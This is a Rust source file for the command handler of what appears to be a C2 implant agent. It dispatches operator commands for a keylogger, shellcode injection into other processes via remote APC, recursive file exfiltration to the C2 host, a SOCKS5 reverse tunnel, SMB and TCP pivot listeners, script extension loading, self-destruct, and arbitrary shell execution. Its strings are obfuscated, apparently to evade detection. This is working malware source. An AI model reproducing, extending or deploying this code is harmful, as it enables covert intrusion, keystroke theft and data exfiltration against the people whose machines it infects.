// src/agent/handlers.rs
use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;
use tokio::net::TcpStream;
use tokio_util::compat::{TokioAsyncReadCompatExt, FuturesAsyncReadCompatExt};
use yamux::Connection;
use futures::StreamExt;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

use crate::common::{CommandResponse, SecuredCommand};
use crate::utils;
use crate::file_transfer;
use crate::socks;
use crate::agent::scripting::{self, ExtensionManager}; // Updated import
use crate::agent::pivot::PivotManager;
use crate::agent::injection;
use crate::lc;
use crate::agent::keylogger; 

pub struct HandlerContext {
    pub proxy_handle: Arc<Mutex<Option<tokio::task::AbortHandle>>>,
    pub ext_manager: Arc<Mutex<ExtensionManager>>,
    pub c2_host: String,
    pub tx: mpsc::Sender<Vec<u8>>,
    pub pivot_mgr: Arc<Mutex<PivotManager>>,
}

// Enum to handle different types of state changes
pub enum AgentAction {
    UpdateConfig(u64, u32, u32), // Sleep, Min, Max
    SetMode(bool),               // true = Active, false = Passive
    None,
}

pub async fn dispatch(ctx: &HandlerContext, msg: SecuredCommand) -> AgentAction {
    let req_id = msg.counter;
    let cmd = msg.command.as_str();
    let mut action = AgentAction::None;

    let (output, error, exit_code) = if cmd.starts_with(&lc!("sleep ")) {
        let parts: Vec<&str> = cmd.split_whitespace().collect();
        if parts.len() >= 4 {
            if let (Ok(s), Ok(min), Ok(max)) = (parts[1].parse::<u64>(), parts[2].parse::<u32>(), parts[3].parse::<u32>()) {
                action = AgentAction::UpdateConfig(s, min, max);
                (format!("{} {}s, {}-{}-{}%", lc!("Configuration Updated: Sleep"), s, lc!("Jitter"), min, max), String::new(), 0)
            } else { (String::new(), lc!("Parse Error"), 1) }
        } else { (String::new(), lc!("Usage: sleep <seconds> <min> <max>"), 1) }
        
    } else if cmd == lc!("beacon:mode active") {
        action = AgentAction::SetMode(true);
        (lc!("Beacon Activated (Fast Mode)"), String::new(), 0)
        
    } else if cmd == lc!("beacon:mode passive") {
        action = AgentAction::SetMode(false);
        (lc!("Beacon Deactivated (Passive Mode)"), String::new(), 0)
        
    } else if cmd.starts_with(&lc!("pivot:listener_tcp ")) {
        let port = cmd.split_whitespace().nth(1).unwrap_or("0").parse::<u16>().unwrap_or(0);
        if port > 0 {
            let res = ctx.pivot_mgr.lock().unwrap().start_agent_listener(port).await;
            (res, String::new(), 0)
        } else { (String::new(), lc!("Invalid Port"), 1) }
        
    } else if cmd.starts_with(&lc!("pivot:listener_smb ")) {
        let name = cmd.split_whitespace().nth(1).unwrap_or("");
        if !name.is_empty() {
            let res = ctx.pivot_mgr.lock().unwrap().start_named_pipe_listener(name.to_string()).await;
            (res, String::new(), 0)
        } else {
            (String::new(), lc!("Usage: pivot:listener_smb <pipe_name>"), 1)
        }

    } else if cmd.starts_with(&lc!("proxy:start ")) {
        handle_proxy_start(ctx, cmd, req_id).await
        
    } else if cmd == lc!("proxy:stop") {
        handle_proxy_stop(ctx)
        
    } else if cmd.starts_with(&lc!("ext:load ")) {
        handle_extension(ctx, cmd)
        
    } else if cmd.starts_with(&lc!("file:read_recursive|")) {
        handle_recursive_download(ctx, cmd, req_id).await;
        return action;
        
    } else if cmd.starts_with(&lc!("file:write|")) {
        handle_file_write(cmd)
        
    } else if cmd.starts_with(&lc!("file:read|")) {
        handle_file_read(cmd)
    
    // [NEW] NATIVE FILE BROWSING
    } else if cmd.starts_with(&lc!("fs:ls ")) {
        let path = cmd.strip_prefix(&lc!("fs:ls ")).unwrap_or(".");
        let json_output = scripting::get_directory_json(path);
        (json_output, String::new(), 0)

    } else if cmd.starts_with(&lc!("proc:inject ")) {
        handle_injection(cmd.to_string()).await
    
    // --- KEYLOGGER COMMANDS ---
    } else if cmd == lc!("keylogger:start") {
        let msg = keylogger::start();
        (msg, String::new(), 0)

    } else if cmd == lc!("keylogger:stop") {
        let msg = keylogger::stop();
        (msg, String::new(), 0)

    } else if cmd == lc!("keylogger:dump") {
        let logs = keylogger::get_logs();
        if logs.is_empty() {
            (lc!("(Buffer Empty)"), String::new(), 0)
        } else {
            (logs, String::new(), 0)
        }
    // -------------------------------

    } else if cmd == lc!("sys:die") {
        let _ = ctx.tx.send(serde_json::to_vec(&CommandResponse {
            request_id: req_id, output: lc!("Self-destruct..."), error: String::new(), exit_code: 0 
        }).unwrap()).await;
        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
        utils::self_destruct();
        
    } else {
        utils::execute_shell_command(cmd)
    };

    let resp = CommandResponse { request_id: req_id, output, error, exit_code };
    if let Ok(data) = serde_json::to_vec(&resp) {
        let _ = ctx.tx.send(data).await;
    }

    action
}

async fn handle_proxy_start(ctx: &HandlerContext, cmd: &str, _req_id: u64) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 2 { return (String::new(), lc!("Usage: proxy:start <port>"), 1); }
    
    let port = match parts[1].parse::<u16>() {
        Ok(p) => p,
        Err(_) => return (String::new(), lc!("Invalid Port"), 1),
    };

    if let Some(handle) = ctx.proxy_handle.lock().unwrap().take() {
        handle.abort();
    }

    let host = ctx.c2_host.clone();
    let handle = tokio::spawn(async move {
        let addr = format!("{}:{}", host, port);
        if let Ok(stream) = TcpStream::connect(&addr).await {
            let stream = Box::pin(TokioAsyncReadCompatExt::compat(stream));
            let connection = Connection::new(stream, yamux::Config::default(), yamux::Mode::Client);
            yamux::into_stream(connection).for_each_concurrent(None, |s| async move {
                if let Ok(yamux_stream) = s {
                    let mut tokio_stream = FuturesAsyncReadCompatExt::compat(yamux_stream);
                    let _ = socks::handle_socks5_stream(&mut tokio_stream).await;
                }
            }).await;
        }
    });

    *ctx.proxy_handle.lock().unwrap() = Some(handle.abort_handle());
    (format!("{} {}", lc!("Proxy Tunnel Started on Port"), port), String::new(), 0)
}

fn handle_proxy_stop(ctx: &HandlerContext) -> (String, String, i32) {
    if let Some(handle) = ctx.proxy_handle.lock().unwrap().take() {
        handle.abort();
        (lc!("Proxy Stopped"), String::new(), 0)
    } else {
        (lc!("No proxy running"), String::new(), 1)
    }
}

fn handle_extension(ctx: &HandlerContext, cmd: &str) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() < 2 { return (String::new(), lc!("Invalid extension format"), 1); }

    let b64_str = parts[1];
    let script_args: Vec<String> = parts.iter().skip(2).map(|s| s.to_string()).collect();

    match BASE64.decode(b64_str) {
        Ok(bytes) => match String::from_utf8(bytes) {
            Ok(script) => {
                let mut manager = ctx.ext_manager.lock().unwrap();
                let result = manager.run_script(&script, script_args);
                (result, String::new(), 0)
            },
            Err(_) => (String::new(), lc!("UTF8 Error"), 1),
        },
        Err(_) => (String::new(), lc!("Base64 Error"), 1),
    }
}

async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: u64) {
    let parts: Vec<&str> = cmd.splitn(2, '|').collect();
    if parts.len() != 2 { return; }
    
    let root_path = parts[1].to_string();
    let tx = ctx.tx.clone();
    
    tokio::spawn(async move {
        let files = file_transfer::find_all_files(&root_path);
        let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();
        let root_name = std::path::Path::new(&root_path).file_name().unwrap_or_default().to_string_lossy().to_string();
        
        let mut report = file_transfer::RecursiveReport { 
            root_path: root_path.clone(), total_files_found: files.len(), total_success: 0, failed_downloads: Vec::new() 
        };

        for path in files {
            let path_str = path.to_string_lossy().to_string();
            let rel_path = path_str.clone(); 

            match file_transfer::read_file_to_b64(&path_str) {
                Ok((b64, perms)) => {
                    let output = format!("file:data_batch|{}|{}|{}|{}|{}", batch_ts, root_name, rel_path, perms, b64);
                    let resp = CommandResponse { request_id: req_id, output, error: String::new(), exit_code: 0 };
                    if let Ok(j) = serde_json::to_vec(&resp) { let _ = tx.send(j).await; }
                    report.total_success += 1;
                    tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
                },
                Err(e) => report.failed_downloads.push((path_str, e)),
            }
        }
        
        let rep_json = serde_json::to_string(&report).unwrap_or_default();
        let final_out = format!("file:report_batch|{}|{}|{}", batch_ts, root_name, rep_json);
        let resp = CommandResponse { request_id: req_id, output: final_out, error: String::new(), exit_code: 0 };
        if let Ok(j) = serde_json::to_vec(&resp) { let _ = tx.send(j).await; }
    });
}

fn handle_file_write(cmd: &str) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.splitn(3, '|').collect();
    if parts.len() == 3 {
        match file_transfer::write_file_simple(parts[1], parts[2]) {
            Ok(_) => (format!("{}: {}", lc!("File written"), parts[1]), String::new(), 0),
            Err(e) => (String::new(), e, 1),
        }
    } else { (String::new(), lc!("Upload error"), 1) }
}

fn handle_file_read(cmd: &str) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.splitn(2, '|').collect();
    if parts.len() == 2 {
        match file_transfer::read_file_to_b64(parts[1]) {
            Ok((b64, perms)) => (format!("file:data|{}|{}|{}", parts[1], perms, b64), String::new(), 0),
            Err(e) => (String::new(), e, 1),
        }
    } else { (String::new(), lc!("Read error"), 1) }
}

async fn handle_injection(cmd: String) -> (String, String, i32) {
    let parts: Vec<String> = cmd.split_whitespace().map(|s| s.to_string()).collect();
    
    // Command format: proc:inject <pid> <base64_data>
    if parts.len() != 3 {
        return (String::new(), lc!("Usage: proc:inject <pid> <base64_shellcode>"), 1);
    }

    let pid_res = parts[1].parse::<u32>();
    let b64_res = BASE64.decode(&parts[2]);

    let (pid, shellcode) = match (pid_res, b64_res) {
        (Ok(p), Ok(s)) => (p, s),
        (Err(_), _) => return (String::new(), format!("{}: {}", lc!("Invalid PID"), parts[1]), 1),
        (_, Err(_)) => return (String::new(), lc!("Invalid Base64 Shellcode"), 1),
    };

    let code_len = shellcode.len();

    let task_result = tokio::task::spawn_blocking(move || {
        std::panic::catch_unwind(|| {
            injection::inject_remote_apc(pid, &shellcode)
        })
    }).await;

    match task_result {
        Ok(panic_result) => match panic_result {
            Ok(inject_result) => match inject_result {
                Ok(_) => (format!("{} {} {} {} {}", lc!("Success: Injected"), code_len, lc!("bytes into PID"), pid, ""), String::new(), 0),
                Err(e) => (String::new(), format!("{}: {}", lc!("Injection Failed"), e), 1)
            },
            Err(_) => (String::new(), lc!("Injection Panic: Caught critical failure in injection module."), 1)
        },
        Err(e) => (String::new(), format!("{}: {}", lc!("Task execution failed"), e), 1)
    }
}
